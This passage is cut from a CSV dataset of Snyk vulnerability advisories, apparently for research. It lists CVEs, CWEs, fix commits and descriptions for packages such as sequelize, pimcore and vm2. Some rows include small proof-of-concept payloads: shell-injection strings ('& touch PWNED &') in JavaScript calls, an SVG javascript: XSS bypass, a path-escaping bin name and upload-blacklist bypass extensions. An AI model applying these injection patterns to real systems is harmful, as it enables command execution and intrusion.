to prevent injecting a command",JavaScript,7.5,high,"git-diff-apply is a package that can be used to reach an unrelated remote repository to apply a git diff.
Affected versions of this package are vulnerable to Command Injection. In ""index.js"" file, line 240, the run command executes the git command with an user controlled variable called remoteUrl.
PoC by JHU System Security Lab
var root = require(""git-diff-apply"");
var attack_code = ""&touch Song&"";
root({""remoteUrl"": ""&touch Song&"", ""startTag"": ""none""})",2020
CVE-2019-10777,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-AWSLAMBDA-540839,07/01/2020,07/01/2020,https://github.com/awspilot/cli-lambda-deploy/commit/0985a18bffb265817bc84836c9a65f2bb04a51ac,Command Injection,https://api.github.com/repos/awspilot/cli-lambda-deploy/commits/0985a18bffb265817bc84836c9a65f2bb04a51ac,adrianpraja,adrian@databank.ro,cli-lambda-deploy,0985a18bffb265817bc84836c9a65f2bb04a51ac,sanity check for function name,JavaScript,7.5,high,"aws-lambda is a command line tool deploy code to AWS Lambda.
Affected versions of this package are vulnerable to Command Injection. The config.FunctioName is used to construct the argument used within the exec function without any sanitization. It is possible for a user to inject arbitrary commands to the zipCmd used within config.FunctionName located in the file lib/main.js (line 78).
PoC by JHU System Security Lab
// aws-lambda-config.lambda
{""FunctionName"": ""& touch Song &"", 
""PATH"": ""./""}

var root = require(""aws-lambda"");
root.deploy(""aws-lambda-config"");",2020
,CWE-434,Snyk,https://security.snyk.io/vuln/SNYK-PHP-VEROTCLASSUPLOADPHP-538304,19/12/2019,19/12/2019,https://github.com/verot/class.upload.php/commit/b234947c62f94adb704920dd0e66a122007e21a8,Arbitrary File Upload,https://api.github.com/repos/verot/class.upload.php/commits/b234947c62f94adb704920dd0e66a122007e21a8,Colin Verot,colin@verot.net,class.upload.php,b234947c62f94adb704920dd0e66a122007e21a8,refactor extension blacklisting,PHP,7.5,high,"verot/class.upload.php is a PHP class that can be used to upload files and manipulate images very easily.
Affected versions of this package are vulnerable to Arbitrary File Upload. The following extensions could be used to bypass the blacklist provided by the package and achieve code execution under certain circumstances. 

.phpt
.phtm
.phps
.inc",2019
CVE-2019-10774,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-PHP-MIKEHAERTLPHPSHELLCOMMAND-538426,20/12/2019,20/12/2019,https://github.com/mikehaertl/php-shellcommand/commit/8d98d8536e05abafe76a491da87296d824939076,Command Injection,https://api.github.com/repos/mikehaertl/php-shellcommand/commits/8d98d8536e05abafe76a491da87296d824939076,Michael Härtl,mh@m-h-it.de,php-shellcommand,8d98d8536e05abafe76a491da87296d824939076,"Merge pull request #45 from Kirill89/master

Update addArg() to improve escaping",PHP,7.5,high,"mikehaertl/php-shellcommand is an object oriented interface to shell commands
Affected versions of this package are vulnerable to Command Injection. User input is concatenated with a command within addArg() that will be executed without any check.",2019
CVE-2019-10770,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-IORATPACK-534882,25/01/2020,19/11/2019,https://github.com/ratpack/ratpack/commit/a3cbb13be1527874528c3b99fc33517c0297b6d3,Cross-site Scripting (XSS),https://api.github.com/repos/ratpack/ratpack/commits/a3cbb13be1527874528c3b99fc33517c0297b6d3,John Engelman,john.engelman@target.com,ratpack,a3cbb13be1527874528c3b99fc33517c0297b6d3,Escape user input rendered to the response in the development error handler.,Java,6.3,medium,"io.ratpack:ratpack-core is a simple, capable, toolkit for creating high performance web applications.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). This affects the development mode error handler when an exception message contains untrusted data. 
Note the production mode error handler is not vulnerable - so for this to be utilized in production it would require users to not disable development mode.",2020
CVE-2020-7596,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-CODECOV-543183,24/01/2020,08/01/2020,https://github.com/codecov/codecov-node/commit/2f4eff90dd21e58dd56074dc4933b15a91373de6,Command Injection,https://api.github.com/repos/codecov/codecov-node/commits/2f4eff90dd21e58dd56074dc4933b15a91373de6,Joe Becher,jwbecher@drazisil.com,codecov-node,2f4eff90dd21e58dd56074dc4933b15a91373de6,Sanitize gcov-args,JavaScript,6.5,medium,"codecov is a npm package for uploading reports to Codecov.
Affected versions of this package are vulnerable to Command Injection. The value provided as part of the gcov-args argument is executed by the exec function within lib/codecov.js.
PoC by JHU System Security Lab
var root = require(""codecov"");
var args = {
  ""options"": {
    'gcov-args': ""& touch PWNED &""
  }
}
root.handleInput.upload(args, function(){}, function(){});",2020
CVE-2019-10773,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-PNPMPACKAGEBINS-539934,13/12/2019,11/12/2019,https://github.com/pnpm/package-bins/commit/adefce5b1ba635d3c8d48692f753a3f49ea0bb3b,Arbitrary File Write,https://api.github.com/repos/pnpm/package-bins/commits/adefce5b1ba635d3c8d48692f753a3f49ea0bb3b,Zoltan Kochan,z@kochan.io,package-bins,adefce5b1ba635d3c8d48692f753a3f49ea0bb3b,"fix: filter out dangerous bin names

Dangerous bin names are bin names that try to fool the package
manager to create the command file in a directory outside the
target node_modules/.bin directory.

For instance:

```
""bin"": { ""~/node/node"": ""bad"" }
```

More about this issue at: https://gist.github.com/DanielRuf/32787933313860a92039999c9f6f3d25",TypeScript,2.6,low,"@pnpm/package-bins is a that returns bins of a package.
Affected versions of this package are vulnerable to Arbitrary File Write. The package install functionality can be abused to generate arbitrary symlinks on the host filesystem by using specially crafted bin keys. Existing files could be overwritten depending on the current user permission set.",2019
CVE-2019-10773,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-YARN-537806,13/12/2019,11/12/2019,https://github.com/pnpm/package-bins/commit/adefce5b1ba635d3c8d48692f753a3f49ea0bb3b,Arbitrary File Write,https://api.github.com/repos/pnpm/package-bins/commits/adefce5b1ba635d3c8d48692f753a3f49ea0bb3b,Zoltan Kochan,z@kochan.io,package-bins,adefce5b1ba635d3c8d48692f753a3f49ea0bb3b,"fix: filter out dangerous bin names

Dangerous bin names are bin names that try to fool the package
manager to create the command file in a directory outside the
target node_modules/.bin directory.

For instance:

```
""bin"": { ""~/node/node"": ""bad"" }
```

More about this issue at: https://gist.github.com/DanielRuf/32787933313860a92039999c9f6f3d25",TypeScript,2.6,low,"yarn is a package for dependency management.
Affected versions of this package are vulnerable to Arbitrary File Write. The package install functionality can be abused to generate arbitrary symlinks on the host filesystem by using specially crafted bin keys. Existing files could be overwritten depending on the current user permission set.",2019
CVE-2019-10772,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-ENSHRINEDSVGSANITIZE-536969,09/12/2019,09/12/2019,https://github.com/darylldoyle/svg-sanitizer/commit/6add43e5c5649bc40e3afcb68c522720dcb336f9,Sanitizer Bypass,https://api.github.com/repos/darylldoyle/svg-sanitizer/commits/6add43e5c5649bc40e3afcb68c522720dcb336f9,Daryll Doyle,daryll@enshrined.co.uk,svg-sanitizer,6add43e5c5649bc40e3afcb68c522720dcb336f9,Merge branch 'hotfix/non-ns-xlink',PHP,7.5,high,"enshrined/svg-sanitize is a SVG sanitizer for PHP
Affected versions of this package are vulnerable to Sanitizer Bypass. It is possible to bypass enshrined\svgSanitize\Sanitizer using the xlink:href attribute due to mishandling of the xlink namespace.
PoC by Snyk Security Team
<?xml version=""1.0"" standalone=""no""?>
<!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"">
<svg version=""1.1"" baseProfile=""full"" xmlns=""http://www.w3.org/2000/svg"">
    <a xlink:href=""javascript:alert(1)""><text x=""20"" y=""20"">XSS</text></a>
</svg>",2019
CVE-2019-10767,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-IOBROKERJSCONTROLLER-534881,21/11/2019,10/10/2019,https://github.com/ioBroker/ioBroker.js-controller/commit/f6e292c6750a491a5000d0f851b2fede4f9e2fda,Directory Traversal,https://api.github.com/repos/ioBroker/ioBroker.js-controller/commits/f6e292c6750a491a5000d0f851b2fede4f9e2fda,Ingo Fischer,github@fischer-ka.de,ioBroker.js-controller,f6e292c6750a491a5000d0f851b2fede4f9e2fda,some security enhancements to better prevent path traversing,JavaScript,7.5,high,"iobroker.js-controller is a controller that is owning the central configuration of the ioBroker installation and controls and monitors all adapter processes for the current host.
Affected versions of this package are vulnerable to Directory Traversal. An attacker can include file contents from outside the /adapter/xxx/ directory, where xxx is the name of an existent adapter like ""admin"". It is exploited using the administrative web panel with a request for an adapter file.
Note:  The attacker has to be logged in if the authentication is enabled (by default isn't enabled).",2019
,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-DEVALUE-536388,01/12/2019,01/12/2019,https://github.com/Rich-Harris/devalue/commit/0debc411fef5028abfac1d40b7553c0bde089c5f,Cross-site Scripting (XSS),https://api.github.com/repos/Rich-Harris/devalue/commits/0debc411fef5028abfac1d40b7553c0bde089c5f,Richard Harris,richard.a.harris@gmail.com,devalue,0debc411fef5028abfac1d40b7553c0bde089c5f,-> v2.0.1,Markdown,6.5,medium,"devalue is a JSON.stringify, but handles cyclical references, repeated references, undefined, regular expressions, dates, Map and Set.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). It does not properly mitigate against unsafe characters in serialized regular expressions.",2019
CVE-2019-10768,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-ANGULAR-534884,19/11/2019,06/11/2019,https://github.com/angular/angular.js/commit/add78e62004e80bb1e16ab2dfe224afa8e513bc3,Prototype Pollution,https://api.github.com/repos/angular/angular.js/commits/add78e62004e80bb1e16ab2dfe224afa8e513bc3,Pete Bacon Darwin,pete@bacondarwin.com,angular.js,add78e62004e80bb1e16ab2dfe224afa8e513bc3,"fix(angular.merge): do not merge __proto__ property

By blocking `__proto__` on deep merging, this commit
prevents the `Object` prototype from being polluted.",JavaScript,7.3,high,"angular is a package that lets you write client-side web applications as if you had a smarter browser. It also lets you use HTML as your template language and lets you extend HTML’s syntax to express your application’s components clearly and succinctly.
Affected versions of this package are vulnerable to Prototype Pollution. The function merge() could be tricked into adding or modifying properties of Object.prototype using a __proto__ payload.",2019
CVE-2019-10765,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-IOBROKERADMIN-534634,19/11/2019,09/10/2019,https://github.com/ioBroker/ioBroker.admin/commit/16b2b325ab47896090bc7f54b77b0a97ed74f5cd,Directory Traversal,https://api.github.com/repos/ioBroker/ioBroker.admin/commits/16b2b325ab47896090bc7f54b77b0a97ed74f5cd,GermanBluefox,dogafox@gmail.com,ioBroker.admin,16b2b325ab47896090bc7f54b77b0a97ed74f5cd,"### 3.6.8 (2019-10-09)
* (bluefox) Log paths were sanitized
* (bluefox) NPM packages were updated",Markdown,7.5,high,"iobroker.admin is an User interface for configuration and administration of ioBroker.
Affected versions of this package are vulnerable to Directory Traversal. An attacker can include file contents from outside the /log/file1/ directory.
Note: The attacker has to be logged in if the authentication option is enabled (by default isn't enabled).",2019
CVE-2019-10771,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-IOBROKERWEB-534971,19/11/2019,07/11/2019,https://github.com/ioBroker/ioBroker.web/commit/24ebb6d3714feac87570ce7a2e827fd2f91aa043,Cross-site Scripting (XSS),https://api.github.com/repos/ioBroker/ioBroker.web/commits/24ebb6d3714feac87570ce7a2e827fd2f91aa043,GermanBluefox,dogafox@gmail.com,ioBroker.web,24ebb6d3714feac87570ce7a2e827fd2f91aa043,"### 2.4.10 (2019-11-07)
* (bluefox) Workaround for material was added",Markdown,6.5,medium,"iobroker.web is a Web server on the base of Node.js and express to read the files from ioBroker DB.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). Characters in the GET url path are not properly escaped and can be reflected in the server response.",2019
CVE-2019-10768,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-ANGULARJSCORE-1579456,19/11/2019,06/11/2019,https://github.com/angular/angular.js/commit/add78e62004e80bb1e16ab2dfe224afa8e513bc3,Prototype Pollution,https://api.github.com/repos/angular/angular.js/commits/add78e62004e80bb1e16ab2dfe224afa8e513bc3,Pete Bacon Darwin,pete@bacondarwin.com,angular.js,add78e62004e80bb1e16ab2dfe224afa8e513bc3,"fix(angular.merge): do not merge __proto__ property

By blocking `__proto__` on deep merging, this commit
prevents the `Object` prototype from being polluted.",JavaScript,7.3,high,"AngularJS.Core is an AngularJS.* package for other Angular modules within .NET.
Affected versions of this package are vulnerable to Prototype Pollution. The function merge() could be tricked into adding or modifying properties of Object.prototype using a __proto__ payload.",2019
CVE-2019-10766,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-PHP-USMANHALALITPIXIE-534879,19/11/2019,28/10/2019,https://github.com/usmanhalalit/pixie/commit/9bd991021abbcbfb19347a07dca8b7e518b8abc9,SQL Injection,https://api.github.com/repos/usmanhalalit/pixie/commits/9bd991021abbcbfb19347a07dca8b7e518b8abc9,Muhammad Usman,hi@usman.it,pixie,9bd991021abbcbfb19347a07dca8b7e518b8abc9,"Security fix for SQL Injection vulnerability
Thanks to https://snyk.io/ for finding the bug.",Markdown,9.4,critical,"usmanhalalit/pixie is a lightweight, expressive, framework agnostic query builder for PHP.
Affected versions of this package are vulnerable to SQL Injection. The library does not escape the limit() param.",2019
CVE-2019-10763,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-480391,17/11/2019,17/11/2019,https://github.com/pimcore/pimcore/commit/608ef5d81ba34d034c9b70519bbc6806ad115d68,SQL Injection,https://api.github.com/repos/pimcore/pimcore/commits/608ef5d81ba34d034c9b70519bbc6806ad115d68,Bernhard Rusch,bernhard.rusch@elements.at,pimcore,608ef5d81ba34d034c9b70519bbc6806ad115d68,[Data Objects] fixed possible SQL injection in classification store definition,PHP,6.7,medium,"pimcore/pimcore is a content & product management framework (CMS/PIM/E-Commerce).
Affected versions of this package are vulnerable to SQL Injection. An attacker with limited privileges (classes permission) can achieve a SQL injection that can lead in data leakage. The vulnerability can be exploited via id, storeId, pageSize and tables parameters, using a payload for trigger a time based or error based sql injection.",2019
CVE-2019-10764,CWE-362,Snyk,https://security.snyk.io/vuln/SNYK-PHP-SIMPLITOELLIPTICPHP-534576,18/11/2019,18/11/2019,https://github.com/simplito/elliptic-php/commit/15652609aa55968d56685c2a9120535ccdc00fd9,Timing Attack,https://api.github.com/repos/simplito/elliptic-php/commits/15652609aa55968d56685c2a9120535ccdc00fd9,Sebastian Smyczyński,s.smyczynski@simplito.com,elliptic-php,15652609aa55968d56685c2a9120535ccdc00fd9,"ecdsa: Apply nonce bit-length mitigation to stop timing leakage.

Ported from elliptic-js: https://github.com/indutny/elliptic/pull/203",PHP,5.9,medium,"simplito/elliptic-php is a Fast, general Elliptic Curve Cryptography library.
Affected versions of this package are vulnerable to Timing Attack. Practical recovery of the long-term private key generated by the library is possible under certain conditions. Leakage of a bit-length of the scalar during scalar multiplication is possible on an elliptic curve which might allow practical recovery of the long-term private key.",2019
CVE-2019-10762,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-PHP-CATFANMEDOO-474562,27/10/2019,27/10/2019,https://github.com/catfan/Medoo/commit/659864b393961bf224bba1efc03b7dcbed7de533,SQL Injection,https://api.github.com/repos/catfan/Medoo/commits/659864b393961bf224bba1efc03b7dcbed7de533,Angel Lai,catfan.me@gmail.com,Medoo,659864b393961bf224bba1efc03b7dcbed7de533,[fix] Fix columnQuote for security issue reported by Snyk,PHP,9.8,critical,"catfan/medoo is a lightweight PHP database framework to accelerate development.
Affected versions of this package are vulnerable to SQL Injection. None",2019
CVE-2019-10761,CWE-265,Snyk,https://security.snyk.io/vuln/SNYK-JS-VM2-473188,16/10/2019,07/04/2019,https://github.com/patriksimek/vm2/commit/4b22d704e4794af63a5a2d633385fd20948f6f90,Sandbox Bypass,https://api.github.com/repos/patriksimek/vm2/commits/4b22d704e4794af63a5a2d633385fd20948f6f90,Patrik Simek,patrik@patriksimek.cz,vm2,4b22d704e4794af63a5a2d633385fd20948f6f90,Fixes sandbox escape (#197),JavaScript,8.3,high,"vm2 is a sandbox that can run untrusted code with whitelisted Node's built-in modules.
Affected versions of this package are vulnerable to Sandbox Bypass. It is possible  to trigger a RangeError exception from the host rather than the ""sandboxed"" context by reaching the stack call limit with an infinite recursion. The returned object is then used to reference the mainModule property of the host code running the script allowing it to spawn a child_process and execute arbitrary code.",2019
CVE-2019-17513,CWE-113,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-IORATPACK-473841,18/10/2019,17/10/2019,https://github.com/ratpack/ratpack/commit/c560a8d10cb8bdd7a526c1ca2e67c8f224ca23ae,HTTP Response Splitting,https://api.github.com/repos/ratpack/ratpack/commits/c560a8d10cb8bdd7a526c1ca2e67c8f224ca23ae,Luke Daley,ld@ldaley.com,ratpack,c560a8d10cb8bdd7a526c1ca2e67c8f224ca23ae,Add test for response header validation,Groovy,7.3,high,"io.ratpack:ratpack-core is a simple, capable, toolkit for creating high performance web applications.
Affected versions of this package are vulnerable to HTTP Response Splitting. If untrusted and unsanitized data is used to populate the headers of an HTTP response, an attacker can utilize this vulnerability to have the server issue any HTTP response they specify. The root cause was due to using the netty DefaultHttpHeaders object with verification disabled.
If your application uses arbitrary user input as the value of a response header it is vulnerable.
If your application does not use arbitrary values as response header values, it is not vulnerable.",2019
CVE-2019-10757,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-JS-KNEX-471962,07/10/2019,07/10/2019,https://github.com/tgriesser/knex/commit/988fb243898d746a759d422762685a79eddf99ca,SQL Injection,https://api.github.com/repos/tgriesser/knex/commits/988fb243898d746a759d422762685a79eddf99ca,Igor Savin,iselwin@gmail.com,knex,988fb243898d746a759d422762685a79eddf99ca,Fix MSSQL escaping (#3382),Markdown,9.8,critical,"knex is a query builder for PostgreSQL, MySQL and SQLite3
Affected versions of this package are vulnerable to SQL Injection. None",2019
CVE-2019-10756,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-NODEREDDASHBOARD-471939,07/10/2019,24/07/2019,https://github.com/node-red/node-red-dashboard/commit/870382792f679b0a6bbf45b29ca7f6428e51623b,Cross-site Scripting (XSS),https://api.github.com/repos/node-red/node-red-dashboard/commits/870382792f679b0a6bbf45b29ca7f6428e51623b,Dave Conway-Jones,conway@uk.ibm.com,node-red-dashboard,870382792f679b0a6bbf45b29ca7f6428e51623b,fix script injection to notification - bump to 2.17.0,Markdown,5.7,medium,"node-red-dashboard is a provides a set of nodes in Node-RED to quickly create a live data dashboard.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS).",2019
CVE-2019-10751,CWE-601,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-HTTPIE-460107,20/08/2019,24/06/2019,https://github.com/jakubroztocil/httpie/commit/df36d6255df5793129b02ac82f1010171bd8a0a8,Open Redirect,https://api.github.com/repos/jakubroztocil/httpie/commits/df36d6255df5793129b02ac82f1010171bd8a0a8,Jakub Roztocil,jakub@roztocil.co,httpie,df36d6255df5793129b02ac82f1010171bd8a0a8,"Changed the way the output filename is generated

When ``--download`` without ``--output`` results in a redirect,
now only the initial URL is considered, not the final one.",Unknown,8.8,high,"httpie is a command line HTTP client.
Affected versions of this package are vulnerable to Open Redirect that allows an attacker to write an arbitrary file with supplied filename and content to the current directory, by redirecting a request from HTTP to a crafted URL pointing to a server in his or hers control.
Depending on the context of using this command, this can lead to remote code execution and possibly privilege escalation.",2019
CVE-2019-16317,CWE-502,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-451599,15/07/2019,19/03/2019,https://github.com/pimcore/pimcore/commit/6ee5d8536d0802e377594cbe39083e822710aab9,Deserialization of Untrusted Data,https://api.github.com/repos/pimcore/pimcore/commits/6ee5d8536d0802e377594cbe39083e822710aab9,Bernhard Rusch,bernhard.rusch@elements.at,pimcore,6ee5d8536d0802e377594cbe39083e822710aab9,[Asset] do not allow PHAR upload,PHP,6.4,medium,"pimcore/pimcore is a content & product management framework (CMS/PIM/E-Commerce).
Affected versions of this package are vulnerable to Deserialization of Untrusted Data. It is possible insert the php wrapper “phar” with an arbitrary path in filename parameter that allows arbitrary code execution via automatic deserialization.",2019
CVE-2019-16318,CWE-434,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PIMCOREPIMCORE-451598,15/07/2019,19/03/2019,https://github.com/pimcore/pimcore/commit/732f1647cc6e0a29b5b1f5d904b4d726b5e9455f,Arbitrary File Upload,https://api.github.com/repos/pimcore/pimcore/commits/732f1647cc6e0a29b5b1f5d904b4d726b5e9455f,Bernhard Rusch,bernhard.rusch@elements.at,pimcore,732f1647cc6e0a29b5b1f5d904b4d726b5e9455f,[Asset] do not allow filenames longer than 255 characters,PHP,7.6,high,"pimcore/pimcore is a content & product management framework (CMS/PIM/E-Commerce).
Affected versions of this package are vulnerable to Arbitrary File Upload. It is possible to for a user to upload a .php file when creating a permission on the assets feature, resulting in arbitrary code execution. This is achieved by bypassing the .txt extension automatically added by the framework by uploading a file with 256 characters name, automatically removing the .txt extension.",2019
CVE-2019-5448,CWE-300,Snyk,https://security.snyk.io/vuln/SNYK-JS-YARN-451571,15/07/2019,12/07/2019,https://github.com/yarnpkg/yarn/commit/2f08a7405cc3f6fe47c30293050bb0ac94850932,Man-in-the-Middle (MitM),https://api.github.com/repos/yarnpkg/yarn/commits/2f08a7405cc3f6fe47c30293050bb0ac94850932,Maël Nison,nison.mael@gmail.com,yarn,2f08a7405cc3f6fe47c30293050bb0ac94850932,"Forces using https for the regular registries (#7393)

* Forces using https for the regular registries

* Fixes linting

* Updates the changelog

* Adds npmjs.com to the list",Markdown,8.2,high,"yarn is a package for dependency management.
Affected versions of this package are vulnerable to Man-in-the-Middle (MitM). Npm credentials such as _authToken were found to be sent over clear text when processing scoped packages that are listed as resolved. This could allow a suitably positioned attacker to eavesdrop and compromise the sent credentials.",2019
CVE-2019-10752,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-JS-SEQUELIZE-459751,19/08/2019,18/08/2019,https://github.com/sequelize/sequelize/commit/9bd0bc111b6f502223edf7e902680f7cc2ed541e,SQL Injection,https://api.github.com/repos/sequelize/sequelize/commits/9bd0bc111b6f502223edf7e902680f7cc2ed541e,Sushant,sushantdhiman@outlook.com,sequelize,9bd0bc111b6f502223edf7e902680f7cc2ed541e,fix(sequelize.json.fn): use common path extraction for mysql/mariadb/sqlite (#11329),JavaScript,7.3,high,"sequelize is a promise-based Node.js ORM for Postgres, MySQL, MariaDB, SQLite and Microsoft SQL Server.
Affected versions of this package are vulnerable to SQL Injection due to sequelize.json() helper function not escaping values properly when formatting sub paths for JSON queries for MySQL, MariaDB and SQLite.",2019
CVE-2019-10749,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-JS-SEQUELIZE-450222,21/06/2019,20/06/2019,https://github.com/sequelize/sequelize/commit/ee4017379db0059566ecb5424274ad4e2d66bc68,SQL Injection,https://api.github.com/repos/sequelize/sequelize/commits/ee4017379db0059566ecb5424274ad4e2d66bc68,Sushant,sushantdhiman@outlook.com,sequelize,ee4017379db0059566ecb5424274ad4e2d66bc68,fix(postgres): json path key quoting (#11088),JavaScript,7.3,high,"sequelize is a promise-based Node.js ORM for Postgres, MySQL, MariaDB, SQLite and Microsoft SQL Server.
Affected versions of this package are vulnerable to SQL Injection due to JSON path keys not being properly sanitized in the Postgres dialect.",2019
CVE-2019-10748,CWE-89,Snyk,https://security.snyk.io/vuln/SNYK-JS-SEQUELIZE-450221,21/06/2019,20/06/2019,https://github.com/sequelize/sequelize/commit/a72a3f5,SQL Injection,https://api.github.com/repos/sequelize/sequelize/commits/a72a3f5,Sushant,sushantdhiman@outlook.com,sequelize,a72a3f50bad7772ce96fc62d80f64b109fb2893f,fix(mariadb): properly escape json path key (#11089),JavaScript,7.3,high,"sequelize is a promise-based Node.js ORM for Postgres, MySQL, MariaDB, SQLite and Microsoft SQL Server.
Affected versions of this package are vulnerable to SQL Injection due to JSON path keys not being properly escaped for the MySQL/MariaDB dialects.",2019
CVE-2019-10750,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-DEEPLY-451026,26/06/2019,20/06/2019,https://github.com/alexindigo/deeply/commit/6eccb2f03ec8d3eefc6805053c4cc2a36aab1505,Prototype Pollution,https://api.github.com/repos/alexindigo/deeply/commits/6eccb2f03ec8d3eefc6805053c4cc2a36aab1505,Alex Indigo,iam@alexindigo.com,deeply,6eccb2f03ec8d3eefc6805053c4cc2a36aab1505,"Fixed security vulnerability

Thanks to Snyk.io for responsible disclosure",Unknown,7.3,high,"deeply is an a toolkit for deep structure manipulations, provides deep merge/clone functionality out of the box, and exposes hooks and custom adapters for more control and greater flexibility.
Affected versions of this package are vulnerable to Prototype Pollution. The function assign-deep could be tricked into adding or modifying properties of Object.prototype using a _proto_ payload.",2019
CVE-2019-10747,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-SETVALUE-450213,20/06/2019,19/06/2019,https://github.com/jonschlinkert/set-value/commit/95e9d9923f8a8b4a01da1ea138fcc39ec7b6b15f,Prototype Pollution,https://api.github.com/repos/jonschlinkert/set-value/commits/95e9d9923f8a8b4a01da1ea138fcc39ec7b6b15f,Jon Schlinkert,jon.schlinkert@sellside.com,set-value,95e9d9923f8a8b4a01da1ea138fcc39ec7b6b15f,disallow proto keys,Config files,7.3,high,"set-value is a package that creates nested values and any intermediaries using dot notation ('a.b.c') paths.
Affected versions of this package are vulnerable to Prototype Pollution. The function set-value could be tricked into adding or modifying properties of Object.prototype using any of the constructor, prototype and _proto_ payloads.",2019
CVE-2019-10746,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-MIXINDEEP-450212,20/06/2019,19/06/2019,https://github.com/jonschlinkert/mixin-deep/commit/8f464c8ce9761a8c9c2b3457eaeee9d404fa7af9,Prototype Pollution,https://api.github.com/repos/jonschlinkert/mixin-deep/commits/8f464c8ce9761a8c9c2b3457eaeee9d404fa7af9,Jon Schlinkert,jon.schlinkert@sellside.com,mixin-deep,8f464c8ce9761a8c9c2b3457eaeee9d404fa7af9,disallow constructor and prototype keys,Config files,7.3,high,"mixin-deep is a package that deeply mixes the properties of objects into the first object.
Affected versions of this package are vulnerable to Prototype Pollution. The function mixin-deep could be tricked into adding or modifying properties of Object.prototype using a constructor payload.",2019
,CWE-494,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMGITHUBBENMANESCAFFEINE-174818,11/06/2019,22/02/2019,https://github.com/ben-manes/caffeine/commit/2721dbfdd1f5d43add2afb858e156e3b3d6ce4e8,Unsafe Dependency Resolution,https://api.github.com/repos/ben-manes/caffeine/commits/2721dbfdd1f5d43add2afb858e156e3b3d6ce4e8,Ben Manes,ben.manes@gmail.com,caffeine,2721dbfdd1f5d43add2afb858e156e3b3d6ce4e8,Use https in build files (fixes #301),Config files,,CVE NOT AVAILABLE,"com.github.ben-manes.caffeine:caffeine is a caching library for Java 8.
Affected versions of this package are vulnerable to Unsafe Dependency Resolution due to resolving dependencies over an insecure channel (http).
If the build occurred over an insecure connection, a malicious user could have perform a Man-in-the-Middle attack during the build and alter the build artifacts that were produced.
In case that any of these artifacts were compromised, any developers using these could be altered.
Note: In order to validate that this artifact was not compromised, the maintainer would need to confirm that none of the artifacts published to the registry were not altered with. Until this happens, we can not guarantee that this artifact was not compromised even though the probability that this happened is low. 
We have chosen to alert on this issue when maintainers either decided to issue CVEs themselves, or in cases when maintainers decided against performing audits on there build to verify they had not been compromised.",2019
,CWE-494,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMPAYPALSELION-174827,11/06/2019,22/02/2019,https://github.com/paypal/SeLion/commit/0f01745f9ec00aed4543c6a75aa82df7a226e2f0,Unsafe Dependency Resolution,https://api.github.com/repos/paypal/SeLion/commits/0f01745f9ec00aed4543c6a75aa82df7a226e2f0,Doug Simmons,dsimmons@paypal.com,SeLion,0f01745f9ec00aed4543c6a75aa82df7a226e2f0,Update soantype-nexus-staging url,XML,5.6,medium,"com.paypal.selion:SeLion-Parent is a builds on top of TestNG and Selenium to provide a set of capabilities that get you up and running with WebDriver in a short time.
Affected versions of this package are vulnerable to Unsafe Dependency Resolution due to resolving dependencies over an insecure channel (http).
If the build occurred over an insecure connection, a malicious user could have perform a Man-in-the-Middle attack during the build and alter the build artifacts that were produced.
In case that any of these artifacts were compromised, any developers using these could be altered.
Note: In order to validate that this artifact was not compromised, the maintainer would need to confirm that none of the artifacts published to the registry were not altered with. Until this happens, we can not guarantee that this artifact was not compromised even though the probability that this happened is low. 
We have chosen to alert on this issue when maintainers either decided to issue CVEs themselves, or in cases when maintainers decided against performing audits on there build to verify they had not been compromised.",2019
CVE-2019-10745,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-ASSIGNDEEP-450211,20/06/2019,19/06/2019,https://github.com/jonschlinkert/assign-deep/commit/90bf1c551d05940898168d04066bbf15060f50cc,Prototype Pollution,https://api.github.com/repos/jonschlinkert/assign-deep/commits/90bf1c551d05940898168d04066bbf15060f50cc,Jon Schlinkert,jon.schlinkert@sellside.com,assign-deep,90bf1c551d05940898168d04066bbf15060f50cc,disallow keys,Markdown,7.3,high,"assign-deep is a library for deeply assigning the values of all enumerable-own-properties and symbols from one or more source objects to a target object.
Affected versions of this package are vulnerable to Prototype Pollution. The function assign-deep could be tricked into adding or modifying properties of Object.prototype using either a constructor or a _proto_ payload.",2019
,CWE-494,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGTESTNG-174823,11/06/2019,22/02/2019,https://github.com/cbeust/testng/commit/40ea46dfecafb58017b221f57e90942e361fcb8d,Unsafe Dependency Resolution,https://api.github.com/repos/cbeust/testng/commits/40ea46dfecafb58017b221f57e90942e361fcb8d,Krishnan Mahadevan,krishnan.mahadevan1978@gmail.com,testng,40ea46dfecafb58017b221f57e90942e361fcb8d,"Use HTTPS for loading DTD

